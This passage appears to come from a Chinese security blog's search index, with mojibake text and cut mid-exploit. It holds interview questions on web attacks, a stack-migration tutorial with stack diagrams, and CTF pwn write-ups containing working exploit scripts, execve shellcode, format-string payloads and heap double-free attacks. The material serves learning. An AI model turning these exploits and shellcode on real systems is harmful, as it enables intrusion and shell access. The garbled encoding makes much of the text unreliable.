å¯¹äºéœ€æ±‚ä¸­ä¸æ˜ç¡®çš„åœ°æ–¹ï¼Œåº”åŠæ—¶æ²Ÿé€šï¼Œå¹¶å°½å¯èƒ½åšåˆ°åœ¨è½¯ä»¶éœ€æ±‚ä¸Šæ˜ç¡®æ— æ­§ä¹‰ ","date":"2020-04-11","objectID":"/swingmood/:2:0","tags":["é¡¹ç›®"],"title":"SwingMood é¡¹ç›®å®è·µå¿ƒå¾—","uri":"/swingmood/"},{"categories":["Web å®‰å…¨"],"content":"å­¦å¤ªä¹…äºŒè¿›åˆ¶ï¼Œå»é¢ web å²—çœŸçš„ä¼šé›ªå´©ã€‚ å¯¹é¢è¯•é—®é¢˜ä½œäº†ç®€å•åˆ†ç±»ï¼Œç­”æ¡ˆåŸºæœ¬éƒ½å¯ä»¥ç›´æ¥æœåˆ°ï¼Œè¿™é‡Œå°±ä¸è´´äº†ã€‚ ","date":"2020-03-13","objectID":"/moresec/:0:0","tags":["é¢è¯•"],"title":"MoreSec äº¤å‰é¢è¯•è®°å½•","uri":"/moresec/"},{"categories":["Web å®‰å…¨"],"content":"ä¿¡æ¯æ”¶é›† æ¸—é€æµ‹è¯•çš„ä¸€èˆ¬è¿‡ç¨‹ï¼Ÿ å¦‚ä½•æŸ¥è¯¢ä¸€ä¸ªåŸŸåä¸‹çš„æ‰€æœ‰äºŒçº§åŸŸåï¼Ÿ ä¿¡æ¯æ”¶é›†å¸¸ç”¨çš„æ¸—é€æµ‹è¯•å·¥å…·æœ‰å“ªäº›ï¼Ÿ æ€ä¹ˆç¡®å®šæœåŠ¡ç«¯ç¼–ç¨‹è¯­è¨€ï¼Ÿ ","date":"2020-03-13","objectID":"/moresec/:1:0","tags":["é¢è¯•"],"title":"MoreSec äº¤å‰é¢è¯•è®°å½•","uri":"/moresec/"},{"categories":["Web å®‰å…¨"],"content":"SQL æ³¨å…¥ SQL æ³¨å…¥æœ‰å“ªå‡ å¤§ç±»ï¼Ÿ å¸ƒå°”ç›²æ³¨çš„åŸç†ï¼Ÿ å¸ƒå°”ç›²æ³¨å¸¸ç”¨åˆ°çš„å‡½æ•°ï¼Ÿ æ—¶é—´ç›²æ³¨å¸¸ç”¨åˆ°çš„å‡½æ•°ï¼Ÿ benchmark å‡½æ•°èƒ½ç”¨äºæ—¶é—´ç›²æ³¨çš„åŸç†ï¼Ÿ å¦‚ä½•å¯¹ Oracle æ•°æ®åº“è¿›è¡Œæ—¶é—´ç›²æ³¨ï¼Ÿ æ€ä¹ˆé€šè¿‡ SQL æ³¨å…¥å†™ä¸€å¥è¯æœ¨é©¬ï¼Ÿ ","date":"2020-03-13","objectID":"/moresec/:2:0","tags":["é¢è¯•"],"title":"MoreSec äº¤å‰é¢è¯•è®°å½•","uri":"/moresec/"},{"categories":["Web å®‰å…¨"],"content":"åç«¯å®‰å…¨ å¦‚ä½•é€šè¿‡ redis æœªæˆæƒè®¿é—®æ¼æ´æ‹¿ shellï¼Ÿ MySQL ä¸­ UDF ææƒçš„è¿‡ç¨‹ï¼Ÿ æ–‡ä»¶ä¸Šä¼ å¸¸è§çš„ç»•è¿‡æ–¹å¼æœ‰å“ªäº›ï¼Ÿ ","date":"2020-03-13","objectID":"/moresec/:3:0","tags":["é¢è¯•"],"title":"MoreSec äº¤å‰é¢è¯•è®°å½•","uri":"/moresec/"},{"categories":["Web å®‰å…¨"],"content":"å‰ç«¯å®‰å…¨ HTTP å¤´ä¸­æœ‰å“ªäº›å¯ä»¥é˜²å¾¡ XSSï¼Ÿ js ä¸­é’ˆå¯¹ XSS æ”¯æŒå“ªå‡ ç§ç¼–ç ï¼Ÿ js ä¸­å°†åå…­è¿›åˆ¶è½¬ä¸ºå­—ç¬¦ä¸²çš„å‡½æ•°æ˜¯ï¼Ÿ ä»€ä¹ˆæ˜¯åŒæºç­–ç•¥ï¼Ÿ æœ‰å“ªäº›è¯·æ±‚æ–¹å¼å¯ä»¥è·¨åŸŸï¼Ÿ ","date":"2020-03-13","objectID":"/moresec/:4:0","tags":["é¢è¯•"],"title":"MoreSec äº¤å‰é¢è¯•è®°å½•","uri":"/moresec/"},{"categories":["Web å®‰å…¨"],"content":"äºŒè¿›åˆ¶ äºŒè¿›åˆ¶æ–¹é¢å­¦ä¹ äº†ä»€ä¹ˆï¼Ÿ å †å–·å°„çš„åŸç†ï¼Ÿ æ ˆæº¢å‡ºçš„åŸç†ï¼Ÿ ","date":"2020-03-13","objectID":"/moresec/:5:0","tags":["é¢è¯•"],"title":"MoreSec äº¤å‰é¢è¯•è®°å½•","uri":"/moresec/"},{"categories":["Web å®‰å…¨"],"content":"æ‚é¡¹ æœ‰äº†è§£è¿‡å†…ç½‘æ¸—é€å—ï¼Ÿ è°ˆè°ˆ SRC ç»å†ã€‚æœ‰ä¸ºä¼ä¸š SRC æŒ–è¿‡æ´å—ï¼Ÿ è°ˆè°ˆå…³æ³¨çš„æœ€æ–°çš„ CVEã€‚ æœ‰æ¥è§¦è¿‡ä»£ç å®¡è®¡å—ï¼Ÿæœ‰æ²¡æœ‰ä¸ºå¼€æºæ¡†æ¶æ‰¾å‡ºè¿‡æ¼æ´ï¼Ÿ ç†Ÿæ‚‰çš„ç¼–ç¨‹è¯­è¨€ï¼Ÿ å¯¹æœªæ¥æœ‰ä»€ä¹ˆèŒä¸šè§„åˆ’ï¼Ÿ ","date":"2020-03-13","objectID":"/moresec/:6:0","tags":["é¢è¯•"],"title":"MoreSec äº¤å‰é¢è¯•è®°å½•","uri":"/moresec/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"å‚è€ƒ CTF-Wiki ç”»çš„ä¸€äº›å›¾ã€‚ åœ¨æ ˆæº¢å‡ºç©ºé—´è¾ƒå°æ—¶ï¼Œæˆ‘ä»¬æ— æ³•åœ¨æ ˆä¸Šæ”¾ä¸‹ ROP é“¾ï¼Œè¿™æ—¶å¾€å¾€ä¼šè€ƒè™‘å°†æ ˆè½¬ç§»åˆ°å…¶å®ƒå¯æ‰§è¡Œçš„åœ°æ–¹ï¼ˆå¦‚ bss æ®µ / data æ®µï¼‰ï¼Œè¿™ç§æŠ€æœ¯ç§°ä¸ºæ ˆè¿ç§»ã€‚æ ˆè¿ç§»ä¸€èˆ¬å¯ä»¥åˆ†ä¸º stack pivoting å’Œ frame fakingï¼Œå‰è€…ä¸»è¦å…³æ³¨ espï¼ˆæˆ‘ä»¬ä»¥ 32 ä½ä¸ºä¾‹ï¼Œ64 ä½åŒç†ï¼‰ï¼Œè€Œåè€…å…³æ³¨ ebp å’Œ espã€‚ ","date":"2020-03-04","objectID":"/stack-migration/:0:0","tags":["æ ˆæ¼æ´"],"title":"ç‹¡å…”ä¸‰çªŸï¼šæ ˆè¿ç§»å¯è§†åŒ–çš„å°è¯•","uri":"/stack-migration/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"stack pivoting è¿™ç§æ–¹æ³•æ¯”è¾ƒç®€å•ï¼Œå› ä¸ºåªæ”¹å˜ espï¼Œå› æ­¤åˆ©ç”¨æ¡ä»¶ä¹Ÿæ¯”è¾ƒä¸¥æ ¼ã€‚è¿™ç§æ–¹æ³•é€‚ç”¨äºæ ˆä¸Šå¯ä»¥æ‰§è¡Œ shellcodeï¼Œä½†æ— æ³•æ³„éœ² shellcode åœ°å€çš„æƒ…å†µã€‚ å‡è®¾ç°åœ¨ NX å…³é—­ï¼Œæˆ‘ä»¬é¦–å…ˆå°† shellcode è¾“å…¥åˆ°å­—ç¬¦æ•°ç»„é‡Œï¼Œè¿™é‡Œå‡è®¾ shellcode çš„é•¿åº¦å¤§äºæº¢å‡ºé•¿åº¦ï¼Œè€Œå°äºå­—ç¬¦æ•°ç»„é•¿åº¦åŠ æº¢å‡ºé•¿åº¦ã€‚ ç„¶åï¼Œæˆ‘ä»¬éœ€è¦ä¸€äº›èƒ½å¤Ÿæ§åˆ¶ esp çš„ gadgetsï¼Œä¾‹å¦‚ pop esp/add esp,??/sub esp,?? ç­‰ç­‰ã€‚æˆ‘ä»¬è¿˜éœ€è¦ jmp esp è¿™ä¸ª gadgetã€‚æ¥ä¸‹æ¥å¸ƒç½®æ ˆï¼š | sub esp,0x??; jmp esp | ----------------------- | jmp esp | ----------------------- | saved ebp | \u003c- ebp ----------------------- | padding | ----------------------- | shellcode | \u003c- esp ----------------------- æ³¨æ„è¿™é‡Œçš„ shellcode æ˜¯å¯ä»¥è¦†ç›–æ‰ saved ebp çš„ï¼Œæˆ‘ä»¬å¹¶ä¸å…³å¿ƒå®ƒçš„å€¼ï¼Œå½“ç„¶æ­¤æ—¶ä¹Ÿå°±ä¸éœ€è¦ padding äº†ã€‚ ç°åœ¨æˆ‘ä»¬æ²¡æœ‰ shellcode åœ°å€ï¼Œä½†æ˜¯æˆ‘ä»¬çŸ¥é“æ ˆä¸Šçš„åç§»æ˜¯å›ºå®šçš„ã€‚å› æ­¤æˆ‘ä»¬æ¥ä¸‹æ¥è¦åšçš„å°±æ˜¯è®© esp æŒ‡å‘ shellcode ç„¶å jmp è¿‡å»ï¼Œå°±å¯ä»¥æ‰§è¡Œ shellcode äº†ã€‚sub esp,0x?? çš„åç§»é‡å¯ä»¥æ ¹æ® payload è®¡ç®—å¾—åˆ°ã€‚ å®¹æ˜“äº§ç”Ÿç–‘æƒ‘çš„æ˜¯è¿™é‡Œåˆç”¨ä¸€ä¸ª jmp esp è¦†ç›–äº†è¿”å›åœ°å€ã€‚æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹å‡½æ•°è¿”å›æ—¶ä¼šå‘ç”Ÿä»€ä¹ˆï¼š ----------------------- | | \u003c- ebp | | | | | ... | ----------------------- | sub esp,0x??; jmp esp | ----------------------- | jmp esp | \u003c- esp ----------------------- | saved ebp | ----------------------- | padding | ----------------------- | shellcode | ----------------------- é¦–å…ˆä¼šå¼¹å‡ºå±€éƒ¨å˜é‡ã€saved ebp ç­‰ã€‚æ­¤æ—¶ ebp æ¢å¤åˆ°ä¸Šä¸ªæ ˆå¸§åŸºå€ã€‚ æ¥ä¸‹æ¥è¦å¼¹å‡ºè¿”å›åœ°å€å¹¶è®¾ç½® eip ä¸ºè¿”å›åœ°å€ï¼Œæ­¤æ—¶æœ‰ï¼š | sub esp,0x??; jmp esp | \u003c- esp ----------------------- | jmp esp | ----------------------- | saved ebp | ----------------------- | padding | ----------------------- | shellcode | ----------------------- æ­¤æ—¶æ‰ä¼šæ‰§è¡Œ jmp espï¼Œé‚£ä¹ˆç¨‹åºæ§åˆ¶æµå°±è·³è½¬åˆ°äº† sub esp,0x??; jmp esp è¿™æ¡è¯­å¥çš„åœ°å€ä¸Šï¼Œä»è€Œæ‰§è¡Œè¯¥è¯­å¥ï¼Œè¿™æ · esp å°±æŒ‡å‘äº† shellcode å¹¶æ‰§è¡Œäº†ã€‚ ","date":"2020-03-04","objectID":"/stack-migration/:1:0","tags":["æ ˆæ¼æ´"],"title":"ç‹¡å…”ä¸‰çªŸï¼šæ ˆè¿ç§»å¯è§†åŒ–çš„å°è¯•","uri":"/stack-migration/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"frame faking è¿™ç§æ–¹æ³•æ›´å¸¸è§ï¼Œåˆ©ç”¨éš¾åº¦ä¹Ÿé«˜äºä¸Šé¢é‚£ç§ï¼Œä½†æ˜¯ä¸éœ€è¦å…³é—­ NXï¼Œå¯ç›´æ¥æ„é€  ROP é“¾ã€‚ å‡è®¾ä¸€ä¸ªæ¯”è¾ƒç»å…¸çš„æƒ…å†µï¼Œä¹Ÿå°±æ˜¯ ret2libcï¼šæˆ‘ä»¬å°† ROP é“¾æ‹†åˆ†æˆ 2 æ®µï¼Œå…¶ä¸­ç¬¬ä¸€æ®µæ³„éœ² libcï¼Œç¬¬äºŒæ®µæ‰§è¡Œ system(\"/bin/sh\")ã€‚è¿™ä¸¤æ®µæˆ‘ä»¬åˆ†åˆ«ç§°ä¹‹ä¸º target1 å’Œ target2ã€‚é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦ç¨‹åºæœ‰ä¸€ä¸ªå­˜åœ¨æ ˆæº¢å‡ºæ¼æ´çš„è¯»å…¥æ“ä½œï¼Œæˆ‘ä»¬è¾“å…¥æ„é€ å¥½çš„å†…å®¹ä½¿å¾—æ ˆå¦‚å›¾æ‰€ç¤ºï¼š | 0x100 | ----------- | fake ebp1 | ----------- | 0 | ----------- | leave_ret | ----------- | read | ----------- | fake ebp1 | \u003c- ebp ----------- | | | padding | | | \u003c- esp ----------- è¿™é‡Œçš„ read å‡½æ•°åŠ leave_ret ä¸Šæ–¹çš„ä¸‰ä¸ªå‚æ•°ä¸æ˜¯å¿…éœ€çš„ï¼Œåªè¦æœ‰åŠæ³•å‘ fake ebp1 ä½ç½®å†™å…¥å†…å®¹å³å¯ï¼Œè€Œè¿™ä¸ªä½ç½®ç”±æˆ‘ä»¬è‡ªå·±é€‰å®šï¼ˆé€šå¸¸åœ¨ bss æ®µ / data æ®µï¼‰ã€‚æ¢å¥è¯è¯´ï¼Œæˆ‘ä»¬æœ€å°‘åªéœ€è¦ä¸¤ä¸ªå•å…ƒï¼ˆ32 ä½ 8 å­—èŠ‚ï¼Œ64 ä½ 16 å­—èŠ‚ï¼‰çš„æ ˆæº¢å‡ºï¼Œæˆ–è€…è¯´åªéœ€è¦èƒ½è¦†ç›–åˆ°è¿”å›åœ°å€ï¼Œå°±å¯ä»¥å®ç°è¿ç§»ã€‚ é‚£ä¹ˆ leave_ret æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿè¿™æ¡æ±‡ç¼–è¯­å¥ç­‰ä»·äºï¼š mov esp, ebp pop ebp å¹¶ä¸”ï¼Œè¯¥è¯­å¥åœ¨å‡½æ•°è¿”å›æ—¶æœ¬èº«å°±ä¼šæ‰§è¡Œã€‚å½“æˆ‘ä»¬å°†å®ƒå¡«åœ¨è¿”å›åœ°å€åï¼Œè¿™æ¡è¯­å¥å°±ä¼šè¢«æ‰§è¡Œ 2 æ¬¡ã€‚ ","date":"2020-03-04","objectID":"/stack-migration/:2:0","tags":["æ ˆæ¼æ´"],"title":"ç‹¡å…”ä¸‰çªŸï¼šæ ˆè¿ç§»å¯è§†åŒ–çš„å°è¯•","uri":"/stack-migration/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"ç¬¬ä¸€æ¬¡æ‰§è¡Œ å…ˆçœ‹ leaveï¼š mov esp, ebp å°† esp æŒ‡å‘ ebp æŒ‡å‘çš„ä½ç½®ï¼š | 0x100 | ----------- | fake ebp1 | ----------- | 0 | ----------- | leave_ret | ----------- | read@plt | ----------- | fake ebp1 | \u003c- ebp \u003c- esp ----------- pop ebp å¼¹å‡º fake ebp1ï¼Œèµ‹å€¼ç»™ ebpï¼š | 0x100 | ----------- | fake ebp1 | ----------- | 0 | ----------- | leave_ret | ----------- | read@plt | \u003c- esp ----------- | fake ebp1 | fake ebp1 -\u003e | ... | \u003c- ebp ----------- ----- ç„¶å retï¼Œæ‰§è¡Œ read å‡½æ•°åè¿”å›åˆ°ä¸‹ä¸€ä¸ª leave_ret ç»§ç»­æ‰§è¡Œã€‚è¿™é‡Œæˆ‘ä»¬é€šè¿‡ read å¯ä»¥å‘ fake ebp1 ä½ç½®å†™å…¥ target1ï¼š | 0x100 | ---------------- | fake ebp2 | ---------------- | 0 | ---------------- | leave_ret | ---------------- | read@plt | ---------------- | puts@got | ---------------- | pop ebx; ret | ---------------- | puts@plt | ---------------- fake ebp1 -\u003e | fake ebp2 | \u003c- ebp ---------------- è¿™é‡Œçš„ read ä¸ leave_ret å’Œæˆ‘ä»¬ç¬¬ä¸€æ¬¡æ„é€ çš„åŸç†ç±»ä¼¼ï¼Œfake ebp2 ä¸ fake ebp1 ç±»ä¼¼ã€‚æˆ‘ä»¬ç¨åå°±èƒ½çœ‹åˆ°ä¸ºä»€ä¹ˆéœ€è¦å…ˆå¡«ä¸€ä¸ª fake ebp2ã€‚ è‡³æ­¤ï¼Œæˆ‘ä»¬ä¸ºç¬¬ä¸€æ¬¡æ ˆè¿ç§»ä½œå¥½äº†å‡†å¤‡ã€‚ ","date":"2020-03-04","objectID":"/stack-migration/:2:1","tags":["æ ˆæ¼æ´"],"title":"ç‹¡å…”ä¸‰çªŸï¼šæ ˆè¿ç§»å¯è§†åŒ–çš„å°è¯•","uri":"/stack-migration/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"ç¬¬äºŒæ¬¡æ‰§è¡Œ å…ˆçœ‹ leaveï¼š mov esp, ebp å°† esp æŒ‡å‘ ebp æŒ‡å‘çš„ä½ç½®ï¼Œå³ fake ebp1ï¼š | 0x100 | ---------------- | fake ebp2 | ---------------- | 0 | ---------------- | leave_ret | ---------------- | read@plt | ---------------- | puts@got | ---------------- | pop ebx; ret | ---------------- | puts@plt | ---------------- fake ebp1 -\u003e | fake ebp2 | \u003c- ebp \u003c- esp ---------------- pop ebp å¼¹å‡º fake ebp2ï¼Œèµ‹å€¼ç»™ ebpï¼š | 0x100 | ---------------- | fake ebp2 | ---------------- | 0 | ---------------- | leave_ret | ---------------- | read@plt | ---------------- | puts@got | ---------------- | pop ebx; ret | ---------------- | puts@plt | \u003c- esp ---------------- fake ebp1 -\u003e | fake ebp2 | fake ebp2 -\u003e | ... | \u003c- ebp ---------------- ----- è‡³æ­¤æˆ‘ä»¬å·²ç»å®Œæˆäº†ç¬¬ä¸€æ¬¡æ ˆè¿ç§»ã€‚ ç„¶å ret æ‰§è¡Œ target1ï¼Œæ³„éœ² libcã€‚æ¥ç€æ‰§è¡Œ read åå†æ¬¡è¿”å›åˆ° leave_retã€‚è¿™é‡Œæˆ‘ä»¬é€šè¿‡ read å¯ä»¥å‘ fake ebp2 ä½ç½®å†™å…¥ target2ï¼š | addr of /bin/sh | ----------------- | 0xdeadbeef | ----------------- | system@plt | ----------------- fake ebp2 -\u003e | 0xdeadbeef | \u003c- ebp ----------------- è¿™æ ·å°±ä¸ºç¬¬äºŒæ¬¡æ ˆè¿ç§»ä½œå¥½äº†å‡†å¤‡ã€‚æ¥ä¸‹æ¥ç¬¬äºŒæ¬¡æ ˆè¿ç§»çš„è¿‡ç¨‹å°±å’Œç¬¬ä¸€æ¬¡ç›¸åŒäº†ã€‚å› ä¸ºæˆ‘ä»¬è¿™é‡Œåªæ¼”ç¤ºä¸¤æ¬¡è¿ç§»ï¼Œå› æ­¤åŸæœ¬åº”è¯¥å¡« fake ebp3 çš„åœ°æ–¹å¡«æˆäº† 0xdeadbeefï¼Œå®é™…ä¸Šä¾ç„¶å¯ä»¥å¡«ä¸€ä¸ªæœ‰æ•ˆçš„å¯å†™åœ°å€ç»§ç»­è¿›è¡Œç¬¬ä¸‰æ¬¡æ ˆè¿ç§»ã€‚ ","date":"2020-03-04","objectID":"/stack-migration/:2:2","tags":["æ ˆæ¼æ´"],"title":"ç‹¡å…”ä¸‰çªŸï¼šæ ˆè¿ç§»å¯è§†åŒ–çš„å°è¯•","uri":"/stack-migration/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"æ€»ç»“ å¯ä»¥çœ‹åˆ°ï¼Œæ ˆè¿ç§»çš„æ ¹æœ¬ç›®æ ‡æ˜¯æ”¹å˜ espï¼Œåªä¸è¿‡ stack pivoting ç”¨ gadgets ç›´æ¥æ›´æ”¹ï¼Œè€Œ frame faking é€šè¿‡ä¿®æ”¹ rbpï¼Œå€ŸåŠ© leave_ret æ¥ä¿®æ”¹ rspï¼Œè¾¾åˆ°ç±»ä¼¼ä¼ªé€ æ ˆå¸§çš„æ•ˆæœã€‚ ","date":"2020-03-04","objectID":"/stack-migration/:3:0","tags":["æ ˆæ¼æ´"],"title":"ç‹¡å…”ä¸‰çªŸï¼šæ ˆè¿ç§»å¯è§†åŒ–çš„å°è¯•","uri":"/stack-migration/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"éš¾é¢˜éƒ½æ²¡æœ‰åšå‡ºæ¥ã€‚é¢˜ç›®æ¥è‡ª ACTF 2019ã€GYCTF 2019ã€VNCTF 2020ã€‚ ","date":"2020-03-01","objectID":"/recent-pwn-medium/:0:0","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"è¿‘æœŸè¿›é˜¶ Pwn åˆé›†","uri":"/recent-pwn-medium/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"ACTF 2019 ","date":"2020-03-01","objectID":"/recent-pwn-medium/:1:0","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"è¿‘æœŸè¿›é˜¶ Pwn åˆé›†","uri":"/recent-pwn-medium/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"babystack åªèƒ½æº¢å‡º 0x10 å­—èŠ‚ï¼Œå› æ­¤ä½¿ç”¨æ ˆè¿ç§»ã€‚è¿™é¢˜çš„è¿ç§»æ¯”è¾ƒç®€å•ï¼Œé¢˜ç›®ç»™äº†æ ˆåœ°å€ï¼Œå¹¶ä¸”åªéœ€è¦è¿ç§»ä¸€æ¬¡ã€‚ leave = 0x400a18 pop_rdi = 0x400ad3 sla('?\\n',str(0xe0)) ru('saved at 0x') addr = int(ru('\\n'),16) # ebp2,payload,padding,fake ebp,leave_ret payload = flat('a'*8,pop_rdi,elf.got['puts'],elf.plt['puts'],0x4008f6).ljust(0xd0,'a') + flat(addr,leave) sa('?\\n',payload) ru('~\\n') puts = uu64(r(6)) system,binsh = ret2libc(puts,'puts') sla('?\\n',str(0xe0)) ru('saved at 0x') addr = int(ru('\\n'),16) payload = flat('a'*8,pop_rdi,binsh,system).ljust(0xd0,'a') + flat(addr,leave) sa('?\\n',payload) ","date":"2020-03-01","objectID":"/recent-pwn-medium/:1:1","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"è¿‘æœŸè¿›é˜¶ Pwn åˆé›†","uri":"/recent-pwn-medium/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"ä¸€ä¸ªå¤è¯»æœº å¾ˆå®¹æ˜“å‘ç°æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œé¦–å…ˆæµ‹å‡ºåç§»ä¸º 7 å¤„æ˜¯è¿”å›åœ°å€ï¼Œæˆ‘ä»¬å¾€è¿™é‡Œå†™åœ°å€å³å¯ã€‚å†™ä»€ä¹ˆåœ°å€å‘¢ï¼Ÿç¨‹åºæ²¡æœ‰å¼€å¯ NX ä¿æŠ¤ï¼Œå› æ­¤å¯ä»¥å…ˆå¸ƒç½® shellcodeï¼Œç„¶åå†™ shellcode åœ°å€ã€‚ ä½†æ˜¯æˆ‘ä»¬åªèƒ½åœ¨æ ˆä¸Šå¸ƒç½® shellcodeï¼Œè€Œæ ˆåœ°å€ä»¥ 0xff å¼€å¤´ï¼Œå¦‚æœç›´æ¥å†™å…¥ 4 å­—èŠ‚åœ°å€ï¼Œé‚£ä¹ˆéœ€è¦è¾“å‡ºéå¸¸é•¿çš„å­—ç¬¦ä¸²æ‰è¡Œï¼Œéå¸¸è€—æ—¶ã€‚å› æ­¤æˆ‘ä»¬å°è¯•åˆ† 2 æ¬¡å†™å…¥ï¼Œæ¯æ¬¡ 2 å­—èŠ‚ã€‚ ä» è¿™é‡Œ ç›—å–äº†ä¸€å¼ ä¸é”™çš„å›¾ç¤ºï¼š To illustrate why we write payload in that way This is an example stack layout, supposing the leak address is 0xffffc970 *---------------* c930 | 0xffffc970 | (addr of format string) *---------------* c934 | xxxxxxxxxx | 1$ (first parameter of printf) *---------------* ..... *---------------* c94c | return addr | 7$ *---------------* ..... *---------------* c970 | 0xffffc94c | 16$ (start addr of read buffer) *---------------* c974 | \"%516\" | 17$ (51628 = 0xc9b0 - 4) *---------------* c978 | \"28d%\" | 18$ *---------------* c97c | \"16$h\" | 19$ *---------------* c980 | \"naaa\" | 20$ *---------------* c984 | 0xffffc94e | 21$ *---------------* c988 | \"%138\" | 22$ (13869 = 0xffff - 0xc9b0 - 4 - 3) *---------------* c98c | \"69d%\" | 23$ *---------------* c990 | \"21$h\" | 24$ *---------------* c994 | \"naaa\" | 25$ *---------------* c998 | \"aaaa\" | 26$ *---------------* ..... *---------------* c9b0 | | | shellcode | | | *---------------* é¦–å…ˆè¦å†™çš„ç›®æ ‡æ˜¯ 0xffffc94c ä¹Ÿå°±æ˜¯è¿”å›åœ°å€æ‰€åœ¨ä½ç½®ï¼Œå‘è¿™ä¸ªä½ç½®å…ˆå†™å…¥ 0xc9b0 ä¹Ÿå°±æ˜¯åé¢æˆ‘ä»¬è®¡ç®—å‡ºçš„ shellcode åœ°å€çš„ä½ 4 ä½ï¼Œè¿™é‡Œ -4 æ˜¯å› ä¸ºå‰é¢å·²ç»è¾“å‡º 0xffffc94c è¿™ 4 å­—èŠ‚äº†ã€‚å› æ­¤ç¬¬ä¸€æ­¥ payload ä¸º %51628d%16$hnaaaï¼Œæœ€å aaa æ˜¯ä¸ºäº†å‡‘åˆ° 4 å­—èŠ‚å¯¹é½ï¼Œhn æ˜¯ä»¥ 2 å­—èŠ‚å†™å…¥ï¼Œ16 çš„åç§»å¯ä»¥è‡ªåŠ¨åŒ–æµ‹å‡ºã€‚ åŒç†ï¼Œç¬¬äºŒæ­¥è¦å†™å…¥çš„ç›®æ ‡æ˜¯ 0xffffc94eï¼Œå†™å…¥æ•°æ®æ˜¯ shellcode é«˜ 4 ä½å‡å»ä½ 4 ä½ 0xffff-0xc9b0ï¼Œéšå -4 æ˜¯å› ä¸ºå‰é¢å·²ç»è¾“å‡º 0xffffc94e è¿™ 4 å­—èŠ‚ï¼Œ-3 æ˜¯å› ä¸ºç¬¬ä¸€æ­¥å¡«å……çš„ aaa å  3 å­—èŠ‚ã€‚ç¬¬äºŒæ­¥ payload å³ %13869d%21$hnaaaã€‚ ä¸¤æ­¥çš„ payload åˆå¹¶åé•¿ä¸º 0x28 å­—èŠ‚ï¼Œåœ¨åé¢æ”¾ä¸Š shellcodeï¼Œæ­¤æ—¶å³ç¡®å®šäº† shellcode çš„åœ°å€ã€‚è§¦å‘æ¼æ´å°±èƒ½ getshell äº†ã€‚ shellcode = '\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80' sla('Exit\\n','1') buf = int(r(8),16) sc = buf+0x28 ret = buf-0x24 payload = p32(ret)+'%'+str((sc\u00260xffff)-4)+'d%16$hnaaa' payload += p32(ret+2)+'%'+str(((sc\u003e\u003e16)\u00260xffff)-(sc\u00260xffff)-7)+'d%21$hnaaa' payload += shellcode s(payload) sla('Exit\\n','2') ","date":"2020-03-01","objectID":"/recent-pwn-medium/:1:2","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"è¿‘æœŸè¿›é˜¶ Pwn åˆé›†","uri":"/recent-pwn-medium/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"another_repeater é¢˜ç›®åœ¨è¾“å…¥é•¿åº¦æ—¶å¯ä»¥æ•´æ•°æº¢å‡ºï¼Œè¿˜ç»™äº† buf çš„åœ°å€ã€‚é‚£ä¹ˆç›´æ¥è¾“å…¥ -1ï¼Œç„¶å ret2shellcode å³å¯ã€‚ shellcode = '\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80' sla('peat?\\n','-1') addr = int(r(8),16) payload = shellcode.ljust(0x41b+4,'a')+p32(addr) sa('\\n',payload) ","date":"2020-03-01","objectID":"/recent-pwn-medium/:1:3","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"è¿‘æœŸè¿›é˜¶ Pwn åˆé›†","uri":"/recent-pwn-medium/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"babyheap uaf è¦†ç›–æ‰“å°å‡½æ•°ä¸º systemï¼Œå†…å®¹ä¸º /bin/shã€‚ def add(size,content='a'): sla(':','1') sla('size: \\n',str(size)) sa('content: \\n',content) def free(index): sla(':','2') sla('index: \\n',str(index)) def show(index): sla(':','3') sla('index: \\n',str(index)) add(0x20) # 0 add(0x20) # 1 free(0) free(1) binsh = 0x602010 add(0x10,flat(binsh,elf.plt['system'])) # 2 show(0) ","date":"2020-03-01","objectID":"/recent-pwn-medium/:1:4","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"è¿‘æœŸè¿›é˜¶ Pwn åˆé›†","uri":"/recent-pwn-medium/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"message åˆ©ç”¨ double free æ¬ºéª— malloc åˆ†é…ä¸€ä¸ªä½äº bss æ®µçš„ chunkï¼Œä½¿å¾—æˆ‘ä»¬å¯ä»¥æ§åˆ¶å…¨å±€æ•°ç»„ï¼Œä»è€Œä¿®æ”¹ 0 å·å †å—çš„å†…å®¹ã€‚ç„¶åå…ˆæ³„éœ² libc å†åŠ«æŒ __free_hook åˆ° system å³å¯ã€‚éœ€è¦æ³¨æ„ fastbin çš„å¤§å°æ£€æŸ¥ã€‚ def add(size,content='a'): sla(':','1') sla(':\\n',str(size)) sa(':\\n',content) def free(index): sla(':','2') sla(':\\n',str(index)) def edit(index,content): sla(':','3') sla(':\\n',str(index)) sa(':\\n',content) def show(index): sla(':','4') sla(':\\n',str(index)) add(0x50) # 0 add(0x40) # 1 add(0x40) # 2 free(1) free(2) free(1) 